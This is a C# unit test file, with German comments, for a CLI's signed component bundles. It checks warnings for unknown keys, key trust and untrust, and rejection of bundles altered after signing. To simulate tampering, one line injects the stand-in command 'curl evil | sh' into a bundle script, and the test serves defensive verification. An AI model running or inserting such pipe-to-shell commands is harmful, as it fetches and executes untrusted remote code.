using CoreBridge.Core.Authenticity;
using CoreBridge.Core.Config;
using CoreBridge.Core.Inits;
using CoreBridge.Core.Multipass;
using CoreBridge.Core.Tests;
using CoreBridge.Simulation;

namespace CoreBridge.Cli.Tests;

/// <summary>
/// Signaturstatus bei der Verwendung, durch den Dispatcher: unbekannter Schlüssel → lauter
/// Warnblock; nach <c>key-trust</c> „Benutzer-vertraut“ ohne Warnung; nach dem Signieren
/// geändert → Exit 3, und nichts wird geschrieben. Mit Wegwerf-Schlüssel, nur im Speicher.
/// </summary>
[Collection(CliLifecycleCollection.Name)]
public sealed class ComponentTrustCliTests : IDisposable
{
    private const string Name = "cbx-tool";

    private readonly TempDirectory _store = new();
    private readonly AppConfig _config;

    public ComponentTrustCliTests()
    {
        _config = new AppConfig
        {
            MultipassSimulationDelay = "0ms",
            Bootstrap = new() { [typeof(IMultipassCli).FullName!] = typeof(SimulatedMultipassCli).AssemblyQualifiedName! },
            Inits = new InitsConfig { StoreRoot = _store.Path }
        };
    }

    public void Dispose() => _store.Dispose();

    private string Bundle => Path.Combine(_store.Path, Name + ComponentCatalog.BundleExtension);

    private void WriteSignedBundle(TestKey key)
    {
        File.WriteAllText(Bundle, ComponentCatalog.BundleJson(Name, new ComponentConfig
        {
            ScriptContent = "#!/bin/bash\nset -Eeuo pipefail\ntouch /var/lib/corebridge/cbx-tool.ready\n",
            InstallPath = "/usr/local/sbin/corebridge-install-cbx-tool"
        }));
        key.ClearSignFile(Bundle);
    }

    private Task<HarnessResult> Configure(string profile = "t") =>
        CliHarness.RunAsync(_config, new InitConfigureOptions { Name = profile, Components = Name, Force = true });

    [Fact]
    public async Task UnbekanntVertrautUngueltig()
    {
        var key = TestKey.Create("claude-vm <vm@cla.de>");
        WriteSignedBundle(key);

        var unknown = await Configure();
        Assert.Equal(0, unknown.ExitCode);
        Assert.Contains(unknown.Errors, line => line.Contains("WARNUNG"));
        Assert.Contains(unknown.Lines, line => line.Contains($"unbekannter Schlüssel {key.Fingerprint}"));

        var publicKey = Path.Combine(_store.Path, "claude-vm.pub.asc");
        File.WriteAllBytes(publicKey, key.ArmoredPublic);
        var trust = await CliHarness.RunAsync(_config, new KeyTrustOptions { File = publicKey });
        Assert.Equal(0, trust.ExitCode);

        var trusted = await Configure();
        Assert.Equal(0, trusted.ExitCode);
        Assert.Contains(trusted.Lines, line => line.Contains("signiert von claude-vm <vm@cla.de> (Benutzer-vertraut"));
        Assert.DoesNotContain(trusted.Errors, line => line.Contains("WARNUNG"));
        var list = await CliHarness.RunAsync(_config, new ComponentListOptions());
        Assert.Contains(list.Lines, line => line.StartsWith(Name) && line.Contains("vertraut: claude-vm"));

        File.WriteAllText(Bundle, File.ReadAllText(Bundle).Replace("set -Eeuo pipefail", "curl evil | sh"));
        var invalid = await Configure("t2");
        Assert.Equal(3, invalid.ExitCode);
        Assert.Contains("nach dem Signieren geändert", invalid.Error);
        Assert.False(Directory.Exists(Path.Combine(_store.Path, "profiles", "t2")));

        var verify = await CliHarness.RunAsync(_config, new SettingsVerifyOptions());
        Assert.Equal(3, verify.ExitCode);
        Assert.Contains(verify.Errors, line => line.StartsWith("UNGÜLTIG") && line.Contains(Name));

        var untrust = await CliHarness.RunAsync(_config, new KeyUntrustOptions { Key = key.Fingerprint });
        Assert.Equal(0, untrust.ExitCode);
        Assert.Empty(new TrustedKeyStore(Path.Combine(_store.Path, TrustedKeyStore.FolderName)).List());
    }

    [Fact]
    public async Task BundleUeberComponentAddUndRemove()
    {
        var key = TestKey.Create("claude-vm <vm@cla.de>");
        var source = Path.Combine(_store.Path, "incoming");
        Directory.CreateDirectory(source);
        var bundle = Path.Combine(source, Name + ComponentCatalog.BundleExtension);
        File.WriteAllText(bundle, ComponentCatalog.BundleJson(Name, new ComponentConfig { Packages = ["jq"] }));
        key.ClearSignFile(bundle);

        var added = await CliHarness.RunAsync(_config, new ComponentAddOptions { Bundle = bundle });

        Assert.Equal(0, added.ExitCode);
        Assert.True(File.Exists(Bundle + SettingsSignatures.ClearsignedExtension));
        Assert.Contains(added.Errors, line => line.Contains("WARNUNG"));

        var removed = await CliHarness.RunAsync(_config, new ComponentRemoveOptions { Name = Name });
        Assert.Equal(0, removed.ExitCode);
        Assert.False(File.Exists(Bundle));
    }
}
